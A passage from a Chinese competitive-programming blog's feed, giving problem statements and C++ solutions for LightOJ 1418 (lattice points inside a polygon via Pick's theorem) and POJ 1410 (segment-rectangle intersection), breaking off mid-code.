      <category term="笔记" scheme="http://wutao18.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="ACM学习" scheme="http://wutao18.github.io/tags/ACM%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="字符串" scheme="http://wutao18.github.io/tags/%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    
      <category term="Manacher" scheme="http://wutao18.github.io/tags/Manacher/"/>
    
  </entry>
  
  <entry>
    <title>LightOJ 1418 Trees on My Island (Pick定理)</title>
    <link href="http://wutao18.github.io/2019/11/12/LightOJ-1418-Trees-on-My-Island-Pick%E5%AE%9A%E7%90%86/"/>
    <id>http://wutao18.github.io/2019/11/12/LightOJ-1418-Trees-on-My-Island-Pick%E5%AE%9A%E7%90%86/</id>
    <published>2019-11-12T15:29:12.000Z</published>
    <updated>2020-10-27T06:19:03.214Z</updated>
    
    <content type="html"><![CDATA[<p>题目链接：<a href="https://vjudge.net/problem/LightOJ-1418" target="_blank" rel="noopener">LightOJ 1418</a></p><h2 id="Problem-Description"><a href="#Problem-Description" class="headerlink" title="Problem Description"></a>Problem Description</h2><blockquote><p>I have bought an island where I want to plant trees in rows and columns. So, the trees will form a rectangular grid and each of them can be thought of having integer coordinates by taking a suitable grid point as the origin.</p><p>But, the problem is that the island itself is not rectangular. So, I have identified a simple polygonal area inside the island with vertices on the grid points and have decided to plant trees on grid points lying strictly inside the polygon.</p><p><img src="https://raw.githubusercontent.com/WuTao18/images/master/gitnote/2019/11/12/1573572162954-1573572163167.png" alt=""></p><p>Figure: A sample of my island</p><p>For example, in the above figure, the green circles form the polygon, and the blue circles show the position of the trees.</p><p>Now, I seek your help for calculating the number of trees that can be planted on my island.</p></blockquote><a id="more"></a><h2 id="Input"><a href="#Input" class="headerlink" title="Input"></a>Input</h2><blockquote><p>Input starts with an integer $T (≤ 100)$, denoting the number of test cases.</p><p>Each case starts with a line containing an integer $N (3 ≤ N ≤ 10000)$ denoting the number of vertices of the polygon.</p><p>Each of the next $N$ lines contains two integers $x_i y_i (-10^6 ≤ x_i, y_i ≤ 10^6)$ denoting the co-ordinate of a vertex. The vertices will be given in clockwise or anti-clockwise order. And they will form a simple polygon.</p></blockquote><h2 id="Output"><a href="#Output" class="headerlink" title="Output"></a>Output</h2><blockquote><p>For each case, print the case number and the total number of trees that can be planted inside the polygon.</p></blockquote><h2 id="Sample-Input"><a href="#Sample-Input" class="headerlink" title="Sample Input"></a>Sample Input</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line"></span><br><span class="line">9</span><br><span class="line"></span><br><span class="line">1 2</span><br><span class="line"></span><br><span class="line">2 1</span><br><span class="line"></span><br><span class="line">4 1</span><br><span class="line"></span><br><span class="line">4 3</span><br><span class="line"></span><br><span class="line">6 2</span><br><span class="line"></span><br><span class="line">6 4</span><br><span class="line"></span><br><span class="line">4 5</span><br><span class="line"></span><br><span class="line">1 5</span><br><span class="line"></span><br><span class="line">2 3</span><br></pre></td></tr></table></figure><h2 id="Sample-Output"><a href="#Sample-Output" class="headerlink" title="Sample Output"></a>Sample Output</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Case 1: 8</span><br></pre></td></tr></table></figure><h2 id="Note"><a href="#Note" class="headerlink" title="Note"></a>Note</h2><blockquote><p>Dataset is huge, use faster I/O methods.</p></blockquote><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><h3 id="题意："><a href="#题意：" class="headerlink" title="题意："></a>题意：</h3><p>给定一个多边形，顶点都在格点上，求多边形内部的格点个数。</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p><a href="https://oi-wiki.org/geometry/pick/" target="_blank" rel="noopener">Pick 定理</a> 裸题。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">double</span> db;</span><br><span class="line"><span class="keyword">const</span> db eps = <span class="number">1e-10</span>;  </span><br><span class="line"><span class="keyword">const</span> db pi = <span class="built_in">acos</span>(<span class="number">-1.0</span>);  </span><br><span class="line"><span class="keyword">const</span> ll inf = <span class="number">0x3f3f3f3f3f3f3f3f</span>;  </span><br><span class="line"><span class="keyword">const</span> ll maxn = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">dcmp</span><span class="params">(db x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">fabs</span>(x) &lt; eps) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> x &gt; <span class="number">0</span>? <span class="number">1</span>: <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    ll x, y;</span><br><span class="line">    Point(ll x = <span class="number">0</span>, ll y = <span class="number">0</span>) : x(x), y(y) &#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">input</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%lld%lld"</span>, &amp;x, &amp;y);</span><br><span class="line">    &#125;</span><br><span class="line">    Point <span class="keyword">operator</span>-(<span class="keyword">const</span> Point a) &#123;</span><br><span class="line">        <span class="keyword">return</span> Point(x - a.x, y - a.y);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">ll <span class="title">cross</span><span class="params">(<span class="keyword">const</span> Point a)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> x * a.y - y * a.x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Point p[maxn];</span><br><span class="line"></span><br><span class="line"><span class="function">ll <span class="title">gcd</span><span class="params">(ll a, ll b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> b == <span class="number">0</span>? a: gcd(b, a % b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> T;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;T);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> _ = <span class="number">1</span>; _ &lt;= T; ++_) &#123;</span><br><span class="line">        <span class="keyword">int</span> n;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line">        ll on = <span class="number">0</span>;</span><br><span class="line">        ll s = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            p[i].input();</span><br><span class="line">        &#125;</span><br><span class="line">        p[n] = p[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            s += (p[i + <span class="number">1</span>] - p[<span class="number">0</span>]).cross(p[i] - p[<span class="number">0</span>]);</span><br><span class="line">            on += gcd(<span class="built_in">abs</span>(p[i].x - p[i + <span class="number">1</span>].x), <span class="built_in">abs</span>(p[i].y - p[i + <span class="number">1</span>].y));</span><br><span class="line">        &#125;</span><br><span class="line">        s = <span class="built_in">abs</span>(s);</span><br><span class="line">        ll in = s / <span class="number">2</span> - on / <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Case %d: "</span>, _);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%lld\n"</span>, in);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目链接：&lt;a href=&quot;https://vjudge.net/problem/LightOJ-1418&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;LightOJ 1418&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;Problem-Description&quot;&gt;&lt;a href=&quot;#Problem-Description&quot; class=&quot;headerlink&quot; title=&quot;Problem Description&quot;&gt;&lt;/a&gt;Problem Description&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;I have bought an island where I want to plant trees in rows and columns. So, the trees will form a rectangular grid and each of them can be thought of having integer coordinates by taking a suitable grid point as the origin.&lt;/p&gt;
&lt;p&gt;But, the problem is that the island itself is not rectangular. So, I have identified a simple polygonal area inside the island with vertices on the grid points and have decided to plant trees on grid points lying strictly inside the polygon.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/WuTao18/images/master/gitnote/2019/11/12/1573572162954-1573572163167.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;Figure: A sample of my island&lt;/p&gt;
&lt;p&gt;For example, in the above figure, the green circles form the polygon, and the blue circles show the position of the trees.&lt;/p&gt;
&lt;p&gt;Now, I seek your help for calculating the number of trees that can be planted on my island.&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="竞赛" scheme="http://wutao18.github.io/categories/%E7%AB%9E%E8%B5%9B/"/>
    
    
      <category term="ACM刷题" scheme="http://wutao18.github.io/tags/ACM%E5%88%B7%E9%A2%98/"/>
    
      <category term="计算几何" scheme="http://wutao18.github.io/tags/%E8%AE%A1%E7%AE%97%E5%87%A0%E4%BD%95/"/>
    
      <category term="Pick定理" scheme="http://wutao18.github.io/tags/Pick%E5%AE%9A%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>POJ 1410 Intersection (计算几何)</title>
    <link href="http://wutao18.github.io/2019/11/11/POJ-1410-Intersection-%E8%AE%A1%E7%AE%97%E5%87%A0%E4%BD%95/"/>
    <id>http://wutao18.github.io/2019/11/11/POJ-1410-Intersection-%E8%AE%A1%E7%AE%97%E5%87%A0%E4%BD%95/</id>
    <published>2019-11-11T14:45:33.000Z</published>
    <updated>2020-10-27T06:19:03.214Z</updated>
    
    <content type="html"><![CDATA[<p>题目链接：<a href="http://poj.org/problem?id=1410" target="_blank" rel="noopener">POJ 1410</a></p><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote><p>You are to write a program that has to decide whether a given line segment intersects a given rectangle. </p><p>An example: </p><p>line: start point: (4,9) </p><p>end point: (11,2) </p><p>rectangle: left-top: (1,5) </p><p>right-bottom: (7,1) </p><p><img src="https://raw.githubusercontent.com/WuTao18/images/master/gitnote/2019/11/11/1573482242971-1573482243153.png" alt=""></p><p>Figure 1: Line segment does not intersect rectangle </p><p>The line is said to intersect the rectangle if the line and the rectangle have at least one point in common. The rectangle consists of four straight lines and the area in between. Although all input values are integer numbers, valid intersection points do not have to lay on the integer grid. </p></blockquote><a id="more"></a><h2 id="Input"><a href="#Input" class="headerlink" title="Input"></a>Input</h2><blockquote><p>The input consists of n test cases. The first line of the input file contains the number n. Each following line contains one test case of the format: </p><p>xstart ystart xend yend xleft ytop xright ybottom </p><p>where (xstart, ystart) is the start and (xend, yend) the end point of the line and (xleft, ytop) the top left and (xright, ybottom) the bottom right corner of the rectangle. The eight numbers are separated by a blank. The terms top left and bottom right do not imply any ordering of coordinates. </p></blockquote><h2 id="Output"><a href="#Output" class="headerlink" title="Output"></a>Output</h2><blockquote><p>For each test case in the input file, the output file should contain a line consisting either of the letter “T” if the line segment intersects the rectangle or the letter “F” if the line segment does not intersect the rectangle. </p></blockquote><h2 id="Sample-Input"><a href="#Sample-Input" class="headerlink" title="Sample Input"></a>Sample Input</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">4 9 11 2 1 5 7 1</span><br></pre></td></tr></table></figure><h2 id="Sample-Output"><a href="#Sample-Output" class="headerlink" title="Sample Output"></a>Sample Output</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">F</span><br></pre></td></tr></table></figure><h2 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h2><p><a href="http://poj.org/searchproblem?field=source&amp;key=Southwestern+European+Regional+Contest+1995" target="_blank" rel="noopener">Southwestern European Regional Contest 1995</a></p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><p>给定一个矩形和一条线段，判断线段是否与矩形相交或者在矩形内部。</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>判断线段是否与矩形每条边相交。至于线段是否在矩形内，判断是否线段两个端点在矩形内即可。</p><p>计算几何模板来在 kuangbin 的模板。</p><h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">double</span> db;</span><br><span class="line"><span class="keyword">const</span> db eps = <span class="number">1e-10</span>;  </span><br><span class="line"><span class="keyword">const</span> db pi = <span class="built_in">acos</span>(<span class="number">-1.0</span>);  </span><br><span class="line"><span class="keyword">const</span> ll inf = <span class="number">0x3f3f3f3f3f3f3f3f</span>;  </span><br><span class="line"><span class="keyword">const</span> ll maxn = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">sgn</span><span class="params">(db x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">fabs</span>(x) &lt; eps) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> x &gt; <span class="number">0</span>? <span class="number">1</span>: <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">double</span> x, y;</span><br><span class="line">    Point(<span class="keyword">double</span> x = <span class="number">0</span>, <span class="keyword">double</span> y = <span class="number">0</span>) : x(x), y(y) &#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">input</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%lf%lf"</span>, &amp;x, &amp;y);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">bool</span> <span class="keyword">operator</span> ==(Point b) <span class="keyword">const</span> &#123;</span><br><span class="line"><span class="keyword">return</span> sgn(x-b.x) == <span class="number">0</span> &amp;&amp; sgn(y-b.y) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">    Point <span class="keyword">operator</span> -(<span class="keyword">const</span> Point &amp;b) <span class="keyword">const</span> &#123;</span><br><span class="line"><span class="keyword">return</span> Point(x - b.x, y - b.y);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//叉积</span></span><br><span class="line"><span class="keyword">double</span> <span class="keyword">operator</span> ^(<span class="keyword">const</span> Point &amp;b) <span class="keyword">const</span> &#123;</span><br><span class="line"><span class="keyword">return</span> x*b.y - y*b.x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//点积</span></span><br><span class="line"><span class="keyword">double</span> <span class="keyword">operator</span> *(<span class="keyword">const</span> Point &amp;b) <span class="keyword">const</span> &#123;</span><br><span class="line"><span class="keyword">return</span> x*b.x + y*b.y;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Line</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Point s, e;</span><br><span class="line">    db angle;</span><br><span class="line">    Line() &#123;&#125;</span><br><span class="line">    Line(Point s, Point e) : s(s), e(e) &#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">input</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%lf%lf%lf%lf"</span>, &amp;s.x, &amp;s.y, &amp;e.x, &amp;e.y);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//`两线段相交判断`</span></span><br><span class="line"><span class="comment">//`2 规范相交`</span></span><br><span class="line"><span class="comment">//`1 非规范相交`</span></span><br><span class="line"><span class="comment">//`0 不相交`</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">segcrossseg</span><span class="params">(Line v)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> d1 = sgn((e - s) ^ (v.s - s));</span><br><span class="line"><span class="keyword">int</span> d2 = sgn((e - s) ^ (v.e - s));</span><br><span class="line"><span class="keyword">int</span> d3 = sgn((v.e - v.s) ^ (s - v.s));</span><br><span class="line"><span class="keyword">int</span> d4 = sgn((v.e - v.s) ^ (e - v.s));</span><br><span class="line"><span class="keyword">if</span>( (d1 ^ d2) == <span class="number">-2</span> &amp;&amp; (d3 ^ d4) == <span class="number">-2</span> ) <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line"><span class="keyword">return</span> (d1 == <span class="number">0</span> &amp;&amp; sgn((v.s - s)*(v.s - e)) &lt;= <span class="number">0</span>) ||</span><br><span class="line">    (d2 == <span class="number">0</span> &amp;&amp; sgn((v.e - s)*(v.e - e)) &lt;= <span class="number">0</span>) ||</span><br><span class="line">    (d3 == <span class="number">0</span> &amp;&amp; sgn((s - v.s) * (s - v.e)) &lt;= <span class="number">0</span>) ||</span><br><span class="line">    (d4 == <span class="number">0</span> &amp;&amp; sgn((e - v.s) * (e - v.e)) &lt;= <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// 点在线段上的判断</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">pointonseg</span><span class="params">(Point p)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> sgn((p - s) ^ (e - s)) == <span class="number">0</span> &amp;&amp; sgn((p - s) * (p - e)) &lt;= <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Rec</span> &#123;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">static</span> <span class="keyword">int</span> n = <span class="number">4</span>;</span><br><span class="line">    Point p[<span class="number">4</span>];</span><br><span class="line">    Line l[<span class="number">4</span>];</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">getline</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">l[i] = Line(p[i], p[(i + <span class="number">1</span>) % n]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//`判断点和任意多边形的关系`</span></span><br><span class="line">    <span class="comment">//` 3 点上`</span></span><br><span class="line">    <span class="comment">//` 2 边上`</span></span><br><span class="line">    <span class="comment">//` 1 内部`</span></span><br><span class="line">    <span class="comment">//` 0 外部`</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">relationpoint</span><span class="params">(Point q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span>(p[i] == q) <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        getline();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span>(l[i].pointonseg(q)) <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            <span class="keyword">int</span> j = (i + <span class="number">1</span>) % n;</span><br><span class="line">            <span class="keyword">int</span> k = sgn((q - p[j])^(p[i] - p[j]));</span><br><span class="line">            <span class="keyword">int</span> u = sgn(p[i].y - q.y);</span><br><span class="line">            <span class="keyword">int</span> v = sgn(p[j].y - q.y);</span><br><span class="line">            <span class="keyword">if</span>(k &gt; <span class="number">0</span> &amp;&amp; u &lt; <span class="number">0</span> &amp;&amp; v &gt;= <span class="number">0</span>) cnt++;</span><br><span class="line">            <span class="keyword">if</span>(k &lt; <span class="number">0</span> &amp;&amp; v &lt; <span class="number">0</span> &amp;&amp; u &gt;= <span class="number">0</span>) cnt--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cnt != <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> T;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;T);</span><br><span class="line">    <span class="keyword">while</span>(T--) &#123;</span><br><span class="line">        Point a, b;</span><br><span class="line">        a.input(), b.input();</span><br><span class="line">        Line l = Line(a, b);</span><br><span class="line">        Rec rec;</span><br><span class="line">        a.input(), b.input();</span><br><span class="line">        rec.p[<span class="number">0</span>] = Point(min(a.x, b.x), min(a.y, b.y));</span><br><span class="line">        rec.p[<span class="number">1</span>] = Point(max(a.x, b.x), min(a.y, b.y));</span><br><span class="line">        rec.p[<span class="number">2</span>] = Point(max(a.x, b.x), max(a.y, b.y));</span><br><span class="line">        rec.p[<span class="number">3</span>] = Point(min(a.x, b.x), max(a.y, b.y));</span><br><span class="line">        <span class="keyword">if</span>(l.segcrossseg(Line(rec.p[<span class="number">0</span>], rec.p[<span class="number">1</span>]))) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"T\n"</span>);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(l.segcrossseg(Line(rec.p[<span class="number">1</span>], rec.p[<span class="number">2</span>]))) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"T\n"</span>);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(l.segcrossseg(Line(rec.p[<span class="number">2</span>], rec.p[<span class="number">3</span>]))) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"T\n"</span>);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(l.segcrossseg(Line(rec.p[<span class="number">3</span>], rec.p[<span class="number">0</span>]))) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span 